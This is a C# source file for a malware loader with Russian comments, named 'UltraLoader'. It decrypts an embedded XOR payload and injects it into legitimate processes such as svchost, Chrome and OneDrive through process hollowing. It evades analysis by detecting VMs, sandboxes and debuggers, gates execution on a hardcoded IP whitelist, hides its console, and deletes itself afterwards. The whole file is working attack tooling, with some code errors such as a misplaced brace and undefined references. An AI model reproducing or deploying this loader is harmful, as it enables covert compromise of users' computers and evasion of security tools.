using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Net;
using System.Security.Cryptography;
using System.Reflection;

namespace StealthModule
{
    /// <summary>
    /// Абсолютно неуязвимый загрузчик с многоступенчатой защитой
    /// </summary>
    public static class UltraLoader
    {
        #region Конфигурация (заполняется билдером)
        private static readonly string PAYLOAD_B64 = "{{PAYLOAD_B64}}";
        private static readonly string XOR_KEY = "{{XOR_KEY}}";
        private static readonly string[] WHITELISTED_IPS = { "127.0.0.1", "::1", "185.123.45.67" };
        #endregion

        #region Константы
        private const uint DELETE = 0x00010000;
        private const uint FILE_SHARE_DELETE = 0x00000004;
        private const uint OPEN_EXISTING = 3;
        private const int FILE_DISPOSITION_INFO = 4;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint MEM_COMMIT = 0x00001000;
        private const uint MEM_RESERVE = 0x00002000;
        private const uint CREATE_SUSPENDED = 0x00000004;
        private const uint CREATE_NO_WINDOW = 0x08000000;
        private const int THREAD_HIDE_FROM_DEBUGGER = 0x11;
        #endregion

        #region Структуры
        [StructLayout(LayoutKind.Sequential)]
        private struct FILE_DISPOSITION_INFO
        {
            public bool DeleteFile;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public IntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        private struct CONTEXT64
        {
            public ulong P1Home; public ulong P2Home; public ulong P3Home; public ulong P4Home; public ulong P5Home; public ulong P6Home;
            public uint ContextFlags; public uint MxCsr;
            public ushort SegCs; public ushort SegDs; public ushort SegEs; public ushort SegFs; public ushort SegGs; public ushort SegSs;
            public uint EFlags;
            public ulong Dr0; public ulong Dr1; public ulong Dr2; public ulong Dr3; public ulong Dr6; public ulong Dr7;
            public ulong Rax; public ulong Rcx; public ulong Rdx; public ulong Rbx; public ulong Rsp; public ulong Rbp; public ulong Rsi; public ulong Rdi;
            public ulong R8; public ulong R9; public ulong R10; public ulong R11; public ulong R12; public ulong R13; public ulong R14; public ulong R15;
            public ulong Rip;
        }
        #endregion

        #region Native Imports (через делегаты)
        private static class NativeApi
        {
            private static Dictionary<string, Delegate> _delegateCache = new Dictionary<string, Delegate>();
            private static Dictionary<string, IntPtr> _moduleCache = new Dictionary<string, IntPtr>();

            static NativeApi()
            {
                GetModule("kernel32.dll");
                GetModule("ntdll.dll");
                GetModule("user32.dll");
            }

            private static IntPtr GetModule(string name)
            {
                if (_moduleCache.ContainsKey(name))
                    return _moduleCache[name];

                IntPtr hMod = GetPInvoke<GetModuleHandleWDelegate>("kernel32.dll", "GetModuleHandleW")(name);
                if (hMod == IntPtr.Zero)
                    hMod = GetPInvoke<LoadLibraryWDelegate>("kernel32.dll", "LoadLibraryW")(name);

                _moduleCache[name] = hMod;
                return hMod;
            }

            private static T GetPInvoke<T>(string module, string function) where T : class
            {
                string key = module + "!" + function;
                if (_delegateCache.ContainsKey(key))
                    return _delegateCache[key] as T;

                IntPtr hModule = GetModule(module);
                IntPtr pFunc = GetProcAddress(hModule, function);
                if (pFunc == IntPtr.Zero)
                    return null;

                var del = Marshal.GetDelegateForFunctionPointer(pFunc, typeof(T)) as T;
                _delegateCache[key] = del;
                return del;
            }

            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            private delegate IntPtr LoadLibraryWDelegate([MarshalAs(UnmanagedType.LPWStr)] string lpFileName);

            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            private delegate IntPtr GetModuleHandleWDelegate([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr GetProcAddressDelegate(IntPtr hModule, string lpProcName);

            private static LoadLibraryWDelegate LoadLibraryW { get { return GetPInvoke<LoadLibraryWDelegate>("kernel32.dll", "LoadLibraryW"); } }
            private static GetModuleHandleWDelegate GetModuleHandleW { get { return GetPInvoke<GetModuleHandleWDelegate>("kernel32.dll", "GetModuleHandleW"); } }
            private static GetProcAddressDelegate GetProcAddress { get { return GetPInvoke<GetProcAddressDelegate>("kernel32.dll", "GetProcAddress"); } }

            public static T GetKernel32<T>(string function) where T : class { return GetPInvoke<T>("kernel32.dll", function); }
            public static T GetNtdll<T>(string function) where T : class { return GetPInvoke<T>("ntdll.dll", function); }
        }

        // Делегаты для WinAPI
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr CreateFileDelegate(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
        private static CreateFileDelegate CreateFile { get { return NativeApi.GetKernel32<CreateFileDelegate>("CreateFileW"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool CloseHandleDelegate(IntPtr hObject);
        private static CloseHandleDelegate CloseHandle { get { return NativeApi.GetKernel32<CloseHandleDelegate>("CloseHandle"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool SetFileInformationByHandleDelegate(IntPtr hFile, int FileInformationClass, ref FILE_DISPOSITION_INFO FileInformation, uint dwBufferSize);
        private static SetFileInformationByHandleDelegate SetFileInformationByHandle { get { return NativeApi.GetKernel32<SetFileInformationByHandleDelegate>("SetFileInformationByHandle"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool IsDebuggerPresentDelegate();
        private static IsDebuggerPresentDelegate IsDebuggerPresent { get { return NativeApi.GetKernel32<IsDebuggerPresentDelegate>("IsDebuggerPresent"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool CheckRemoteDebuggerPresentDelegate(IntPtr hProcess, ref bool isDebuggerPresent);
        private static CheckRemoteDebuggerPresentDelegate CheckRemoteDebuggerPresent { get { return NativeApi.GetKernel32<CheckRemoteDebuggerPresentDelegate>("CheckRemoteDebuggerPresent"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool CreateProcessDelegate(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        private static CreateProcessDelegate CreateProcess { get { return NativeApi.GetKernel32<CreateProcessDelegate>("CreateProcessW"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool ReadProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        private static ReadProcessMemoryDelegate ReadProcessMemory { get { return NativeApi.GetKernel32<ReadProcessMemoryDelegate>("ReadProcessMemory"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
        private static WriteProcessMemoryDelegate WriteProcessMemory { get { return NativeApi.GetKernel32<WriteProcessMemoryDelegate>("WriteProcessMemory"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr VirtualAllocExDelegate(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        private static VirtualAllocExDelegate VirtualAllocEx { get { return NativeApi.GetKernel32<VirtualAllocExDelegate>("VirtualAllocEx"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate uint ResumeThreadDelegate(IntPtr hThread);
        private static ResumeThreadDelegate ResumeThread { get { return NativeApi.GetKernel32<ResumeThreadDelegate>("ResumeThread"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool TerminateProcessDelegate(IntPtr hProcess, uint uExitCode);
        private static TerminateProcessDelegate TerminateProcess { get { return NativeApi.GetKernel32<TerminateProcessDelegate>("TerminateProcess"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate uint ZwUnmapViewOfSectionDelegate(IntPtr ProcessHandle, IntPtr BaseAddress);
        private static ZwUnmapViewOfSectionDelegate ZwUnmapViewOfSection { get { return NativeApi.GetNtdll<ZwUnmapViewOfSectionDelegate>("ZwUnmapViewOfSection"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int ZwQueryInformationProcessDelegate(IntPtr hProcess, int procInfoClass, ref PROCESS_BASIC_INFORMATION procBasicInfo, uint procInfoLen, out uint retLen);
        private static ZwQueryInformationProcessDelegate ZwQueryInformationProcess { get { return NativeApi.GetNtdll<ZwQueryInformationProcessDelegate>("ZwQueryInformationProcess"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr GetCurrentProcessDelegate();
        private static GetCurrentProcessDelegate GetCurrentProcess { get { return NativeApi.GetKernel32<GetCurrentProcessDelegate>("GetCurrentProcess"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr GetCurrentThreadDelegate();
        private static GetCurrentThreadDelegate GetCurrentThread { get { return NativeApi.GetKernel32<GetCurrentThreadDelegate>("GetCurrentThread"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtSetInformationThreadDelegate(IntPtr threadHandle, int threadInformationClass, IntPtr threadInformation, int threadInformationLength);
        private static NtSetInformationThreadDelegate NtSetInformationThread { get { return NativeApi.GetNtdll<NtSetInformationThreadDelegate>("NtSetInformationThread"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool GetThreadContextDelegate(IntPtr hThread, ref CONTEXT64 lpContext);
        private static GetThreadContextDelegate GetThreadContext { get { return NativeApi.GetKernel32<GetThreadContextDelegate>("GetThreadContext"); } }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool SetThreadContextDelegate(IntPtr hThread, ref CONTEXT64 lpContext);
        private static SetThreadContextDelegate SetThreadContext { get { return NativeApi.GetKernel32<SetThreadContextDelegate>("SetThreadContext"); } }
        #endregion

        #region Логирование
        private static string LogPath = Path.Combine(Path.GetTempPath(), "loader_debug.log");

        private static void Log(string message)
        {
            try
            {
                File.AppendAllText(LogPath, string.Format("{0:HH:mm:ss.fff} | {1}\n", DateTime.Now, message));
            }
            catch { }
        }
        #endregion

        #region Детекция VM и отладки
        private static bool IsDebuggerDetected()
        {
            try
            {
                if (IsDebuggerPresent != null && IsDebuggerPresent())
                {
                    Log("[AntiDebug] IsDebuggerPresent detected");
                    return true;
                }

                bool remote = false;
                if (CheckRemoteDebuggerPresent != null)
                {
                    CheckRemoteDebuggerPresent(GetCurrentProcess(), ref remote);
                    if (remote)
                    {
                        Log("[AntiDebug] Remote debugger detected");
                        return true;
                    }
                }

                // Проверка hardware breakpoints
                CONTEXT64 ctx = new CONTEXT64();
                ctx.ContextFlags = 0x100010; // CONTEXT_DEBUG_REGISTERS
                if (GetThreadContext != null && GetThreadContext(GetCurrentThread(), ref ctx))
                {
                    if (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0)
                    {
                        Log("[AntiDebug] Hardware breakpoints detected");
                        return true;
                    }
                }
            }
            catch (Exception ex)
            {
                Log(string.Format("[AntiDebug] Error: {0}", ex.Message));
            }
            return false;
        }

        private static bool IsVirtualMachine()
        {
            try
            {
                // Проверка через WMI
                using (var searcher = new System.Management.ManagementObjectSearcher(
                    "SELECT * FROM Win32_ComputerSystem"))
                {
                    foreach (var obj in searcher.Get())
                    {
                        string manufacturer = obj["Manufacturer"] != null ? obj["Manufacturer"].ToString().ToLower() : "";
                        string model = obj["Model"] != null ? obj["Model"].ToString().ToLower() : "";

                        if (model.Contains("vmware") || model.Contains("virtualbox") ||
                            model.Contains("vbox") || model.Contains("qemu") ||
                            manufacturer.Contains("vmware") || manufacturer.Contains("microsoft corporation"))
                        {
                            Log(string.Format("[AntiVM] Detected VM: {0} {1}", manufacturer, model));
                            return true;
                        }
                    }
                }

                // Проверка размера диска
                DriveInfo d = new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory));
                if (d.IsReady && d.TotalSize < 60L * 1024 * 1024 * 1024)
                {
                    Log("[AntiVM] Small disk detected (sandbox)");
                    return true;
                }

                // Проверка количества ядер
                if (Environment.ProcessorCount < 2)
                {
                    Log("[AntiVM] Less than 2 CPU cores");
                    return true;
                }
            }
            catch { }
            return false;
        }

        private static bool IsWhitelistedIP()
        {
            try
            {
                using (var client = new WebClient())
                {
                    client.Headers.Add("User-Agent", "Mozilla/5.0");
                    string externalIp = client.DownloadString("https://api.ipify.org").Trim();
                    foreach (string ip in WHITELISTED_IPS)
                    {
                        if (ip == externalIp)
                        {
                            Log(string.Format("[Whitelist] IP {0} is allowed", externalIp));
                            return true;
                        }
                    }
                    Log(string.Format("[Whitelist] IP {0} is NOT allowed", externalIp));
                }
            }
            catch (Exception ex)
            {
                Log(string.Format("[Whitelist] Error: {0}", ex.Message));
            }
            return false;
        }
        #endregion

        #region Дешифровка полезной нагрузки
        private static byte[] DecryptPayload()
        {
            try
            {
                if (string.IsNullOrEmpty(PAYLOAD_B64) || string.IsNullOrEmpty(XOR_KEY))
                {
                    Log("[Decrypt] Missing payload or key");
                    return null;
                }

                byte[] data = Convert.FromBase64String(PAYLOAD_B64);
                byte[] key = Encoding.UTF8.GetBytes(XOR_KEY);

                for (int i = 0; i < data.Length; i++)
                    data[i] ^= key[i % key.Length];

                Log(string.Format("[Decrypt] Success: {0} bytes", data.Length));
                return data;
            }
            catch (Exception ex)
            {
                Log(string.Format("[Decrypt] Error: {0}", ex.Message));
                return null;
            }
        }
        #endregion

        #region Process Hollowing (RunPE)
        private static string[] TargetProcesses = {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "OneDrive", "OneDrive.exe"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "Application", "chrome.exe"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Edge", "Application", "msedge.exe"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "svchost.exe"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "dllhost.exe"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "taskhostw.exe")
        };

        private static bool ExecuteRunPE(string targetPath, byte[] payload)
        {
            if (payload == null || payload.Length < 0x40 || BitConverter.ToUInt16(payload, 0) != 0x5A4D)
            {
                Log("[RunPE] Invalid payload");
                return false;
            }

            int e_lfanew = BitConverter.ToInt32(payload, 0x3C);
            if (e_lfanew < 0 || e_lfanew >= payload.Length - 4 ||
                payload[e_lfanew] != 'P' || payload[e_lfanew + 1] != 'E')
            {
                Log("[RunPE] Invalid PE signature");
                return false;
            }

            // Проверка 64-bit
            ushort magic = BitConverter.ToUInt16(payload, e_lfanew + 24);
            if (magic != 0x20B) // PE32+
            {
                Log("[RunPE] Only 64-bit payloads supported");
                return false;
            }

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));

            Log(string.Format("[RunPE] Creating suspended process: {0}", targetPath));
            
            if (CreateProcess == null || !CreateProcess(targetPath, null, IntPtr.Zero, IntPtr.Zero, false,
                CREATE_SUSPENDED | CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
            {
                Log(string.Format("[RunPE] CreateProcess failed: {0}", Marshal.GetLastWin32Error()));
                return false;
            }

            Log(string.Format("[RunPE] Process created: PID={0}", pi.dwProcessId));

            try
            {
                long imageBase = BitConverter.ToInt64(payload, e_lfanew + 0x30);
                int sizeOfImage = BitConverter.ToInt32(payload, e_lfanew + 0x50);

                // Unmap old image
                if (ZwUnmapViewOfSection != null)
                {
                    ZwUnmapViewOfSection(pi.hProcess, (IntPtr)imageBase);
                    Log("[RunPE] Unmapped original image");
                }

                // Allocate memory
                IntPtr newBase = IntPtr.Zero;
                if (VirtualAllocEx != null)
                {
                    newBase = VirtualAllocEx(pi.hProcess, (IntPtr)imageBase, (uint)sizeOfImage,
                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                }

                if (newBase == IntPtr.Zero && VirtualAllocEx != null)
                {
                    newBase = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)sizeOfImage,
                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                }

                if (newBase == IntPtr.Zero)
                {
                    Log("[RunPE] VirtualAllocEx failed");
                    if (TerminateProcess != null) TerminateProcess(pi.hProcess, 0);
                    return false;
                }

                    Log(string.Format("[RunPE] Allocated memory at 0x{0:X}", (long)newBase));
                }

                // Write headers
                uint headerSize = (uint)BitConverter.ToInt32(payload, e_lfanew + 0x54);
                IntPtr bytesWritten;
                if (WriteProcessMemory != null)
                {
                    WriteProcessMemory(pi.hProcess, newBase, payload, headerSize, out bytesWritten);
                    Log(string.Format("[RunPE] Wrote headers: {0} bytes", bytesWritten));
                }

                // Write sections
                short numSections = BitConverter.ToInt16(payload, e_lfanew + 0x06);
                short sizeOfOptHeader = BitConverter.ToInt16(payload, e_lfanew + 0x14);
                int sectionOffset = e_lfanew + 0x18 + sizeOfOptHeader;

                for (int i = 0; i < numSections; i++)
                {
                    int off = sectionOffset + (i * 0x28);
                    uint vAddr = BitConverter.ToUInt32(payload, off + 0x0C);
                    uint rawSize = BitConverter.ToUInt32(payload, off + 0x10);
                    uint rawAddr = BitConverter.ToUInt32(payload, off + 0x14);

                    if (rawSize > 0)
                    {
                        byte[] section = new byte[rawSize];
                        Buffer.BlockCopy(payload, (int)rawAddr, section, 0, (int)rawSize);
                        if (WriteProcessMemory != null) WriteProcessMemory(pi.hProcess, (IntPtr)((long)newBase + vAddr),
                            section, rawSize, out bytesWritten);
                    }
                }
                Log("[RunPE] Sections written");

                // Get PEB and update image base
                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
                uint retLen;
                if (ZwQueryInformationProcess != null)
                {
                    ZwQueryInformationProcess(pi.hProcess, 0, ref pbi,
                        (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), out retLen);
                    if (WriteProcessMemory != null) WriteProcessMemory(pi.hProcess, (IntPtr)((long)pbi.PebAddress + 0x10),
                        BitConverter.GetBytes((long)newBase), 8, out bytesWritten);
                    Log("[RunPE] Updated PEB ImageBase");
                }

                // Get thread context and set new entry point
                CONTEXT64 ctx = new CONTEXT64();
                ctx.ContextFlags = 0x100000; // CONTEXT_FULL
                if (GetThreadContext != null)
                {
                    GetThreadContext(pi.hThread, ref ctx);
                    uint entryPoint = BitConverter.ToUInt32(payload, e_lfanew + 0x28);
                    ctx.Rcx = (ulong)((long)newBase + entryPoint);
                    if (SetThreadContext != null) SetThreadContext(pi.hThread, ref ctx);
                    Log(string.Format("[RunPE] Thread context updated, entry point at 0x{0:X}", (long)newBase + entryPoint));
                }

                // Resume thread
                if (ResumeThread != null) ResumeThread(pi.hThread);
                Log("[RunPE] Thread resumed, payload running");

                return true;
            }
            catch (Exception ex)
            {
                Log(string.Format("[RunPE] Exception: {0}", ex.Message));
                if (TerminateProcess != null) TerminateProcess(pi.hProcess, 0);
                return false;
            }
            finally
            {
                if (CloseHandle != null) CloseHandle(pi.hThread);
                if (CloseHandle != null) CloseHandle(pi.hProcess);
            }
        }
        #endregion

        #region Self-delete (Melt)
        private static void Melt()
        {
            try
            {
                string path = Assembly.GetExecutingAssembly().Location;
                Log(string.Format("[Melt] Self-deleting: {0}", path));

                IntPtr hFile = (CreateFile != null) ? CreateFile(path, DELETE, FILE_SHARE_DELETE, IntPtr.Zero,
                    OPEN_EXISTING, 0, IntPtr.Zero) : (IntPtr)(-1);

                if (hFile != (IntPtr)(-1) && hFile != IntPtr.Zero)
                {
                    FILE_DISPOSITION_INFO info = new FILE_DISPOSITION_INFO { DeleteFile = true };
                    if (SetFileInformationByHandle != null) SetFileInformationByHandle(hFile, FILE_DISPOSITION_INFO, ref info,
                        (uint)Marshal.SizeOf(info));
                    if (CloseHandle != null) CloseHandle(hFile);
                    Log("[Melt] Success");
                }
            }
            catch (Exception ex)
            {
                Log(string.Format("[Melt] Error: {0}", ex.Message));
            }
        }
        #endregion

        #region Hide thread from debugger
        private static void HideCurrentThread()
        {
            try
            {
                if (NtSetInformationThread != null) NtSetInformationThread(GetCurrentThread(),
                    THREAD_HIDE_FROM_DEBUGGER, IntPtr.Zero, 0);
                Log("[AntiDebug] Thread hidden");
            }
            catch { }
        }
        #endregion

        #region Точка входа
        [STAThread]
        public static void Main(string[] args)
        {
            // Скрываем консоль
            var consoleWindow = GetConsoleWindow();
            if (consoleWindow != IntPtr.Zero)
                ShowWindow(consoleWindow, 0);

            Log("========================================");
            Log(string.Format("UltraLoader v1.0 starting at {0}", DateTime.Now));

            // 0. Initialize Protector
            try { Protector.Initialize(); } catch { }

            // 1. Проверка IP (если есть белый список)
            if (WHITELISTED_IPS.Length > 1 && !IsWhitelistedIP())
            {
                Log("[Security] IP not whitelisted, exiting");
                Environment.Exit(0);
                return;
            }

            // 2. Проверка на VM
            if (IsVirtualMachine())
            {
                Log("[Security] VM detected, exiting");
                Environment.Exit(0);
                return;
            }

            // 3. Проверка на отладчик
            if (IsDebuggerDetected())
            {
                Log("[Security] Debugger detected, exiting");
                Environment.Exit(0);
                return;
            }

            // 4. Прячем текущий поток от отладчика
            HideCurrentThread();

            // 5. Дешифровка полезной нагрузки
            byte[] payload = DecryptPayload();
            if (payload == null || payload.Length < 4096)
            {
                Log("[Error] Invalid payload");
                Environment.Exit(0);
                return;
            }

            // 6. Выбор цели и запуск
            bool success = false;
            foreach (string target in TargetProcesses)
            {
                if (!File.Exists(target))
                {
                    Log(string.Format("[Target] Not found: {0}", target));
                    continue;
                }

                Log(string.Format("[Target] Attempting: {0}", target));
                if (ExecuteRunPE(target, payload))
                {
                    success = true;
                    break;
                }
            }

            // 7. Если все методы провалились
            if (!success)
            {
                Log("[Fatal] All RunPE attempts failed");
                // Фолбэк: можно запустить напрямую
                string tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");
                File.WriteAllBytes(tempPath, payload);
                Process.Start(tempPath);
                Log(string.Format("[Fallback] Started directly: {0}", tempPath));
            }

            // 8. Самоуничтожение загрузчика
            Melt();

            Log("[Exit] Loader finished");
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        #endregion
    }
}